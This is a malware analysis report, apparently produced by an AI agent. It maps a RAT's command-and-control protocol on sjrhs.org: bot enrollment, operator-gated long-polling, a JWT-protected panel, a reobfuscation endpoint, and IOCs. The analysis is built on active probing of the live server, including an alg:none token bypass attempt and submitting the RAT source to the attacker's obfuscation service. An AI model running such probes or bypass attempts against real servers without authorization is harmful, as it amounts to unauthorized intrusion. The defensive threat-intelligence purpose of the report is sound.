# C2 Protocol Deep-Dive: ce.ps1 / sjrhs.org

**Date:** 2026-03-14
**Analyst:** Claude Code
**C2 Server:** `https://sjrhs.org` (`77.239.127.22`, rDNS `vm79283.it-garage.network`)
**Method:** Active probing via simulated bot enrollment and HTTP interaction

---

## Overview

The C2 server implements a **three-phase operator-gated long-poll architecture**. Bots are not served follow-on payloads automatically — an operator must manually review incoming registrations and push tasks via a JWT-authenticated management panel.

---

## Phase 1 — Reconnaissance (anonymous bots)

Any `GET /<uuid>` returns the current active task payload regardless of bot identity.

- Response: `sys_info` collection script, 18,237 bytes, cleartext JS (not obfuscated)
- The server **generates a fresh `taskId` UUID per response** — only 27 bytes differ between fetches, all within the `taskId` field at file offset ~15,109
- ETags differ each request (`W/"473d-<hash>"`) confirming server-side per-request generation
- The embedded `taskId` is included in the bot's exfil POST body, allowing the server to correlate task assignments to results

Example diff between two consecutive GET responses:
```
r1: taskId: "dc8c0499-9eaa-4689-a248-8d0d67c68f16"
r2: taskId: "c6c25975-06ad-4b6b-a73b-376feb218715"
```
Only those 36 characters differ — the rest of the 18,237-byte payload is identical.

---

## Phase 2 — Registration

Bot executes the sys_info task and POSTs results:

```
POST /<hwid>
Content-Type: application/json

{
  "type": "sys_info",
  "taskId": "<freshly-received-task-uuid>",
  "machineGuid": "<hwid>",
  "username": "...",
  "hostname": "...",
  "platform": "win32",
  "isAdmin": false,
  "av": ["Windows Defender"],
  ...
}
```

Server responds: `200 OK`

The `taskId` field allows the server to mark the specific task instance as completed for this bot. The HWID transitions from "anonymous" to "registered" state.

---

## Phase 3 — Operator-Gated Long-Poll

After registration, the bot polls its own HWID path for follow-on tasks:

```
GET /<hwid>
```

**Server behavior**: holds the connection open indefinitely — **long-polling**. The connection does not resolve until an operator pushes a task via the management panel.

Confirmed via 10 consecutive polls with timeouts from 1s to 15s — all blocked with no response. This is the normal operating state for registered bots awaiting operator tasking.

**`// ping` response**: Observed once immediately after registration. Likely a brief transitional acknowledgment as the server processes the registration before entering long-poll mode. The bot implementation checks: if response == `// ping` → discard and retry; if response is JS code → execute.

---

## Operator Management Panel

Two protected endpoints were discovered:

| Path | Auth Required | Notes |
|------|--------------|-------|
| `GET /bots` | JWT Bearer | Bot registry / management panel |
| `GET /bots/tasks` | JWT Bearer | Task assignment interface |
| `GET /health` | None | `{"proxy":true,"status":"ok"}` |

### JWT Authentication Behavior

| Request | Response | Interpretation |
|---------|----------|---------------|
| No `Authorization` header | `401 {"message":"No token provided or invalid token format."}` | Middleware requires token |
| `Authorization: Bearer <any_value>` | `403 {"message":"Failed to authenticate token."}` | Token parsed, signature invalid |
| `alg:none` JWT (unsigned) | `403` | `alg:none` attack rejected — secure middleware |

Standard JWT (HS256 or RS256) with a server-side secret. No known bypass.

**`Access-Control-Expose-Headers: Content-Disposition, Content-Length`** on the `/bots` CORS preflight suggests the panel supports file downloads — likely for retrieving exfiltrated data blobs submitted by bots.

### Endpoint Enumeration Summary

| Path | Status |
|------|--------|
| `/bots` | 401 (JWT protected) |
| `/bots/tasks` | 401 (JWT protected) |
| `/health` | 200 `{"proxy":true,"status":"ok"}` |
| `/api/*`, `/admin`, `/dashboard`, `/login`, `/auth` | 404 |
| `/<uuid>` (GET) | 200 — serves current active task |
| `/<hwid>` (POST) | 200 — registers bot / receives exfil |
| `/<hwid>` (GET, post-registration) | Long-poll (blocks) |
| `/api/reobf/<botid>` (POST) | 400/500 — see below |

---

## Reobfuscation Endpoint

`POST /api/reobf/<botid>` — bot submits its own source for fresh obfuscation.

| Submitted Content | Response |
|------------------|----------|
| Obfuscated blob1 (actual RAT source) | `400 Invalid code` |
| Truncated JSON `{"code": "<partial_src>"}` | `500 Obfuscation failed` |
| Correct cleartext source | Expected: obfuscated JS (not obtained — cleartext unavailable) |

The server validates the code structure before running javascript-obfuscator. It rejects the obfuscated version (cannot re-obfuscate already-obfuscated code). Only accepts the original cleartext source, which the legitimate bot would have in memory.

---

## Complete HTTP Method Probe (`/<uuid>`)

| Method | Response |
|--------|----------|
| GET | 200 — serves task JS |
| PUT | 200 — serves task JS |
| POST | 200 — registers bot / receives exfil |
| PATCH | Timeout (long-poll or dropped) |
| DELETE | Timeout |
| OPTIONS | 204 (CORS preflight) |

---

## Architectural Summary

```
                    ┌─────────────────────────────┐
                    │   Ethereum Blockchain        │
                    │   Contract: 0x45729d74...    │
                    │   Returns: https://sjrhs.org │
                    └──────────┬──────────────────┘
                               │ eth_call (on startup)
                               ▼
┌─────────────┐   GET /<uuid>   ┌──────────────────────────────┐
│  New Bot    │ ─────────────► │  sjrhs.org (nginx + Node.js) │
│ (anonymous) │ ◄─────────────  │                              │
└─────────────┘  sys_info task  │   /bots ──► JWT Panel        │
                                │   /bots/tasks ──► JWT Panel  │
┌─────────────┐  POST /<hwid>   │                              │
│  Enrolled   │ ─────────────► │  (registers HWID)            │
│  Bot        │  200 OK         │                              │
│             │                 │                              │
│             │  GET /<hwid>    │                              │
│             │ ─────────────► │  (long-poll: blocks)         │
│             │                 │        ▲                     │
└─────────────┘                 │        │ operator pushes     │
                                │        │ task via /bots panel│
┌─────────────┐                 │        │                     │
│  Operator   │ ──(JWT)──────► │  /bots/tasks                 │
│  Panel      │                 └──────────────────────────────┘
└─────────────┘
```

**Key operator workflow:**
1. Operator checks `/bots` panel — sees new registrations with victim profiles (username, hostname, OS, admin status, AV, domain, GPU)
2. Selects high-value targets
3. Pushes follow-on payload via `/bots/tasks` → resolves the pending long-poll on the selected bot
4. Bot receives and executes the new JS payload

**Operator-gating rationale**: avoids serving destructive payloads to sandboxes, researchers, or low-value targets. The sys_info survey is the filter — only bots matching operator criteria (admin, no AV, domain-joined, high-RAM, etc.) receive further tasking.

---

## IOC Additions

| Type | Value | Context |
|------|-------|---------|
| URL | `https://sjrhs.org/bots` | JWT-auth operator bot panel |
| URL | `https://sjrhs.org/bots/tasks` | JWT-auth task assignment endpoint |
| Header | `Authorization: Bearer <JWT>` | Operator authentication |
| Response | `// ping` | Bot keepalive / registration acknowledgment |
| Response | `{"proxy":true,"status":"ok"}` | `/health` endpoint fingerprint |
